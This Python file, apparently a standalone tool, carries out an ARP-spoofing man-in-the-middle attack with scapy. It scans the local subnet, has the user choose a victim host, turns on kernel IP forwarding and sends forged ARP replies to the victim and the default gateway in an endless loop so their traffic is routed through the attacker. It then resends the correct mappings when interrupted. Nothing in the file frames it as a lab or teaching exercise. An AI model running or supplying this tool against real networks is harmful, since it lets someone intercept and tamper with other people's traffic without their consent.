from scapy.all import ARP, Ether, srp, conf, getmacbyip, sendp, get_if_hwaddr
import os
import ipaddress
import subprocess
import time


def get_ip_range() -> str:
    """
    Query the native Linux networking stack to determine the active interface
    and calculate the local subnet CIDR block.

    Returns:
        str: The IPv4 network range in CIDR notation (e.g., '192.168.1.0/24').

    Raises:
        RuntimeError: If no valid IPv4 address is found on the active interface.
        """
    iface_name = conf.iface.name
    ip_with_cidr_index = 3

    output = subprocess.check_output(
        ["ip", "-o", "-f", "inet", "addr", "show", iface_name],
        text=True
    )

    for line in output.splitlines():
        parts = line.split()
        if len(parts) > ip_with_cidr_index:
            ip_with_cidr = parts[ip_with_cidr_index]
            network = ipaddress.IPv4Network(ip_with_cidr, strict=False)
            return str(network)

    raise RuntimeError(f"[-] No IPv4 address found on interface {iface_name}")


def scan_network(ip_range: str) -> list[dict]:
    """
    Execute a Layer 2 ARP broadcast scan across the specified IP range
    to discover active hosts on the local network segment.

    Args:
        ip_range (str): The target network block in CIDR notation.

    Returns:
        list[dict[str, str]]: A list of dictionaries containing the verified
        'ip' and 'mac' addresses of answering hosts.
    """
    devices_list = []
    timeout = 2
    interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
    print(f"[*] Scanning local network for: {ip_range} on interface {conf.iface}...\n")

    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast / arp_request
    answered_list, unanswered_list = srp(arp_request_broadcast, iface=interface, timeout=timeout, verbose=False)

    for sent_packet, received_packet in answered_list:
        device_dict = {"ip": received_packet.psrc, "mac": received_packet.hwsrc}
        devices_list.append(device_dict)

    print(f"[i] | {'IP Address':<20} | MAC Address")
    print("-" * 45)
    for current_index, device in enumerate(devices_list):
        if gateway_ip != device["ip"]:
            print(f'[{current_index}] | {device["ip"]:<20} | {device["mac"]}')
        else:
            display_ip = f'{device["ip"]} [*]'
            print(f'[{current_index}] | {display_ip:<20} | {device["mac"]}')
    print("-" * 45)
    print(f'[*] Scan completed, please select a target via index.\n')

    return devices_list


def cli_interface(active_list: list[dict]) -> dict[str, str]:
    """
    Provide a command-line interface for the user to select a target
    from the list of discovered network devices with input validation.

    Args:
        active_list (list[dict[str, str]]): Discovered hosts from the network scan.

    Returns:
        dict[str, str]: The selected target's identity pairing maps.
    """
    if not active_list:
        print("[-] No active devices found. Exiting.")
        raise KeyboardInterrupt

    interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")

    while True:
        try:
            target_index = int(input("> "))
            if 0 <= target_index < len(active_list):
                if gateway_ip != (active_list[target_index])["ip"]:
                    break
                else:
                    print('[-] Invalid selection. Cannot choose gateway as target.')
            else:
                print('[-] Invalid index. Please select a number from the list.')

        except ValueError:
            print('[-] Please enter a valid integer.')

    return active_list[target_index]


def poison(operation: int, destination_ip: str, destination_mac: str,
           source_ip: str, source_mac: str, active_interface: str) -> None:
    """
        Construct and transmit an individual Layer 2 Ethernet frame wrapping
        an operational ARP mapping payload.

        Args:
            operation (int): The ARP opcode standard (e.g., 1 for request, 2 for reply).
            destination_ip (str): Target protocol address field.
            destination_mac (str): Target physical hardware address destination destination.
            source_ip (str): Declared protocol origin address mapping.
            source_mac (str): Declared hardware origin address assignment.
            active_interface (str): The name of the local network interface to bind and emit through.
    """
    poison_target = Ether(dst=destination_mac) / ARP(
        op=operation,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    sendp(poison_target, iface=active_interface, verbose=False)


def initiate_mitm(target: dict[str, str]) -> None:
    """
    Execute the active ARP spoofing loop for the specified target.

    This function dynamically enables local IPv4 forwarding via the kernel
    and continuously transmits spoofed ARP replies to intercept traffic
    between the target device and the default gateway.

    Args:
        target (dict[str, str]): A dictionary containing the target's network
                                 identities. Must include 'ip' and 'mac' keys.
    """
    if target is not None:
        print(f'[*] target selected, initiating mitm...\n')
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

        arp_reply = 2
        loop_delay = 1  # seconds

        target_ip = target["ip"]
        target_mac = target["mac"]

        interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
        gateway_mac = getmacbyip(gateway_ip)

        own_mac_address = get_if_hwaddr(conf.iface)
        active_interface = conf.iface.name

        while True:
            poison(arp_reply, target_ip, target_mac, gateway_ip, own_mac_address, active_interface)
            poison(arp_reply, gateway_ip, gateway_mac, target_ip, own_mac_address, active_interface)
            time.sleep(loop_delay)


def cleanup(target: dict[str, str]) -> None:
    """
    Gracefully terminate the application runtime state by resetting kernel
    IP forwarding settings and flashing restorative network tables if required.

    Args:
        target (dict[str, str] | None): Target data payload context to restore,
                or None if terminated prior to entry choice.
    """
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

    if target is not None:
        arp_reply = 2
        loop_delay = 0.1  # seconds

        target_ip = target["ip"]
        target_mac = target["mac"]

        interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
        gateway_mac = getmacbyip(gateway_ip)

        active_interface = conf.iface.name

        for i in range(7):
            poison(arp_reply, target_ip, target_mac, gateway_ip, gateway_mac, active_interface)
            poison(arp_reply, gateway_ip, gateway_mac, target_ip, target_mac, active_interface)

            time.sleep(loop_delay)


if __name__ == "__main__":
    user_selection = None
    try:
        active_network = scan_network(get_ip_range())
        user_selection = cli_interface(active_network)
        initiate_mitm(user_selection)

    except KeyboardInterrupt:
        print('\n[*] Stopping application runtime safely...')
        cleanup(user_selection)
